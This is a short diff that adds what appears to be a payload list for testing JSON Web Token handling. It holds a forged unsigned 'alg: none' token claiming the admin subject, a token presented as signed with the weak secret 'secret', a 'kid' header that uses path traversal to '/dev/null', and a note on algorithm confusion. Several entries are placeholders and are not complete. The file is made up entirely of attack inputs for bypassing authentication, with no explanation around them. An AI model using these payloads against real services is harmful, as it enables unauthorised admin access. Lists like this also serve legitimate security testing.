@@ -1,0 +1,11 @@
+// JWT None Algorithm (Signature Stripped)
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTU5NjU4NjM5OX0.
+
+// JWT Weak Secret (Secret: 'secret')
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTU5NjU4NjM5OX0.SIGNATURE
+
+// JWT Header Manipulation (JKU, JWK, KID)
+{"alg":"HS256","kid":"../../../../dev/null"}.payload.sig
+
+// JWT Algorithm Confusion (RS256 -> HS256 with Public Key as Secret)
+// Need specific key to generate
